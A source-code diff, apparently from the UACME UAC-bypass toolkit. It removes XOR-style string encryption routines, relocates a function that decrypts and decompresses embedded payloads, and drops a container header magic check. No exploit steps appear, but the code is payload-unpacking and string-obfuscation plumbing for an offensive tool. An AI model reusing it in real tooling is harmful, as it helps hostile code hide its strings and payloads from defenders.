@@ -45,116 +45,117 @@ UCM_STRING_TABLE_ENTRY ucmStringTable[] = {
     { ISDB_PROGRAMNAME, sizeof(B_PROGRAM_NAME), B_PROGRAM_NAME }
 };
 
-
-UINT64 StringCryptGenKey(
-    _In_ PWCHAR Key
-)
-{
-    UINT64    k = 0;
-    WCHAR     c;
-
-    while (*Key)
-    {
-        k ^= *Key;
-
-        for (c = 0; c < 8; ++c)
-        {
-            k = (k << 8) | (k >> 56);
-            k += (UINT64)c * 7 + *Key;
-        }
-
-        ++Key;
-    }
-
-    return k;
-}
-
-SIZE_T StringCryptEncrypt(
-    _In_ PWCHAR Src,
-    _In_ PWCHAR Dst,
-    _In_ PWCHAR Key
-)
-{
-    UINT64    k;
-    WCHAR     c;
-    SIZE_T    len = 0;
-
-    k = StringCryptGenKey(Key);
-
-    c = 0;
-    while (*Src)
-    {
-        c ^= *Src + (wchar_t)k;
-        *Dst = c;
-
-        k = (k << 8) | (k >> 56);
-        ++Src;
-        ++Dst;
-        ++len;
-    }
-
-    return len;
-}
-
-VOID StringCryptDecrypt(
-    _In_ PWCHAR Src,
-    _In_ PWCHAR Dst,
-    _In_ SIZE_T Len,
-    _In_ PWCHAR Key)
-{
-    UINT64    k;
-    WCHAR     c, c0;
-
-    k = StringCryptGenKey(Key);
-
-    c = 0;
-    while (Len > 0)
-    {
-        c0 = *Src;
-        *Dst = (c0 ^ c) - (wchar_t)k;
-        c = c0;
-
-        k = (k << 8) | (k >> 56);
-        ++Src;
-        ++Dst;
-        --Len;
-    }
-}
-
 /*
-* DecodeStringById
+* DecompressPayload
 *
 * Purpose:
 *
-* Return decrypted string by ID.
+* Decode payload and then decompress it.
 *
 */
-_Success_(return == TRUE)
-BOOLEAN DecodeStringById(
-    _In_ ULONG Id,
-    _Inout_ LPWSTR lpBuffer,
-    _In_ SIZE_T cbBuffer)
+PVOID DecompressPayload(
+    _In_ ULONG PayloadId,
+    _In_ PVOID pbBuffer,
+    _In_ ULONG cbBuffer,
+    _Out_ PULONG pcbDecompressed
+)
 {
-    ULONG i;
+    BOOL        bResult = FALSE;
+    ULONG       FinalDecompressedSize = 0;
+    SIZE_T      memIO;
+    PUCHAR      UncompressedData = NULL;
 
-    for (i = 0; i < RTL_NUMBER_OF(ucmStringTable); i++) {
-        if (ucmStringTable[i].Id == Id) {
+    PVOID       Data = NULL;
 
-            if (cbBuffer < ucmStringTable[i].DataLength)
+    PBYTE       pbSecret = NULL;
+    DWORD       cbSecret = 0, DataSize;
+
+    NTSTATUS    status;
+
+    __try {
+
+        DataSize = cbBuffer;
+
+        do {
+
+            //
+            // Make a writeable buffer copy.
+            //
+
+            memIO = DataSize;
+            Data = supVirtualAlloc(
+                (PSIZE_T)&memIO,
+                DEFAULT_ALLOCATION_TYPE,
+                DEFAULT_PROTECT_TYPE,
+                &status);
+
+            if ((!NT_SUCCESS(status)) || (Data == NULL))
                 break;
 
-            StringCryptDecrypt((PWCHAR)ucmStringTable[i].Data,
-                (PWCHAR)lpBuffer,
-                (SIZE_T)ucmStringTable[i].DataLength / sizeof(WCHAR),
-                (PWCHAR)RtlNtdllName);
+            supCopyMemory(Data, memIO, pbBuffer, DataSize);
 
-            return TRUE;
-        }
+            //
+            // Get key for decryption.
+            //
+            pbSecret = (PBYTE)SelectSecretFromBlob(PayloadId, &cbSecret);
+            if ((pbSecret == NULL) || (cbSecret == 0))
+                break;
+
+            UncompressedData = (PUCHAR)DecompressContainerUnit(
+                (PBYTE)Data,
+                DataSize,
+                pbSecret,
+                cbSecret,
+                &FinalDecompressedSize);
+
+            if (UncompressedData == NULL)
+                break;
+
+            //
+            // Validate uncompressed data, skip for dotnet.
+            //
+            if (!supVerifyMappedImageMatchesChecksum(UncompressedData, FinalDecompressedSize)) {
+
+                if (!supIsCorImageFile(UncompressedData)) {
+
+#ifdef _DEBUG
+                    supDebugPrint(
+                        TEXT("DecompressPayload"),
+                        ERROR_DATA_CHECKSUM_ERROR);
+#endif
+                    break;
+                }
+            }
+
+            bResult = TRUE;
+
+        } while (FALSE);
+
     }
-    return FALSE;
-}
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        return NULL;
+    }
 
-/*
+    if (pbSecret) supHeapFree(pbSecret);
+
+    if (Data) {
+        supVirtualFree(Data, NULL);
+    }
+
+    if (bResult == FALSE) {
+        if (UncompressedData != NULL) {
+            supVirtualFree(UncompressedData, NULL);
+            UncompressedData = NULL;
+        }
+        FinalDecompressedSize = 0;
+    }
+
+    if (pcbDecompressed)
+        *pcbDecompressed = FinalDecompressedSize;
+
+    return UncompressedData;
+}
+    /*
 * EncodeBuffer
 *
 * Purpose:
@@ -259,14 +260,6 @@ BOOL IsValidContainerHeader(
     DWORD HeaderCrc;
 
     __try {
-        if ((UnitHeader->Magic != UACME_CONTAINER_PACKED_DATA) &&   //Naka
-            (UnitHeader->Magic != UACME_CONTAINER_PACKED_UNIT) &&   //Naka
-            (UnitHeader->Magic != UACME_CONTAINER_PACKED_CODE) &&   //Kuma
-            (UnitHeader->Magic != UACME_CONTAINER_PACKED_KEYS))     //Kuma
-        {
-            return FALSE;
-        }
-
         //
         // Note that IV has different meaning in Kuma containers.
         //
@@ -451,7 +444,6 @@ BOOL DecryptBuffer(
 
     return bResult;
 }
-
 /*
 * DecompressContainerUnit
 *
@@ -544,117 +536,6 @@ PVOID DecompressContainerUnit(
     if (pbDecryptedBuffer != NULL) {
         supVirtualFree(pbDecryptedBuffer, NULL);
     }
-
-    return UncompressedData;
-}
-
-/*
-* DecompressPayload
-*
-* Purpose:
-*
-* Decode payload and then decompress it.
-*
-*/
-PVOID DecompressPayload(
-    _In_ ULONG PayloadId,
-    _In_ PVOID pbBuffer,
-    _In_ ULONG cbBuffer,
-    _Out_ PULONG pcbDecompressed
-)
-{
-    BOOL        bResult = FALSE;
-    ULONG       FinalDecompressedSize = 0;
-    SIZE_T      memIO;
-    PUCHAR      UncompressedData = NULL;
-
-    PVOID       Data = NULL;
-
-    PBYTE       pbSecret = NULL;
-    DWORD       cbSecret = 0, DataSize;
-
-    NTSTATUS    status;
-
-    __try {
-
-        DataSize = cbBuffer;
-
-        do {
-
-            //
-            // Make a writeable buffer copy.
-            //
-
-            memIO = DataSize;
-            Data = supVirtualAlloc(
-                (PSIZE_T)&memIO,
-                DEFAULT_ALLOCATION_TYPE,
-                DEFAULT_PROTECT_TYPE,
-                &status);
-
-            if ((!NT_SUCCESS(status)) || (Data == NULL))
-                break;
-
-            supCopyMemory(Data, memIO, pbBuffer, DataSize);
-
-            //
-            // Get key for decryption.
-            //
-            pbSecret = (PBYTE)SelectSecretFromBlob(PayloadId, &cbSecret);
-            if ((pbSecret == NULL) || (cbSecret == 0))
-                break;
-
-            UncompressedData = (PUCHAR)DecompressContainerUnit(
-                (PBYTE)Data,
-                DataSize,
-                pbSecret,
-                cbSecret,
-                &FinalDecompressedSize);
-
-            if (UncompressedData == NULL)
-                break;
-
-            //
-            // Validate uncompressed data, skip for dotnet.
-            //
-            if (!supVerifyMappedImageMatchesChecksum(UncompressedData, FinalDecompressedSize)) {
-
-                if (!supIsCorImageFile(UncompressedData)) {
-
-#ifdef _DEBUG
-                    supDebugPrint(
-                        TEXT("DecompressPayload"),
-                        ERROR_DATA_CHECKSUM_ERROR);
-#endif
-                    break;
-                }
-            }
-
-            bResult = TRUE;
-
-        } while (FALSE);
-
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        return NULL;
-    }
-
-    if (pbSecret) supHeapFree(pbSecret);
-
-    if (Data) {
-        supVirtualFree(Data, NULL);
-    }
-
-    if (bResult == FALSE) {
-        if (UncompressedData != NULL) {
-            supVirtualFree(UncompressedData, NULL);
-            UncompressedData = NULL;
-        }
-        FinalDecompressedSize = 0;
-    }
-
-    if (pcbDecompressed)
-        *pcbDecompressed = FinalDecompressedSize;
 
     return UncompressedData;
 }
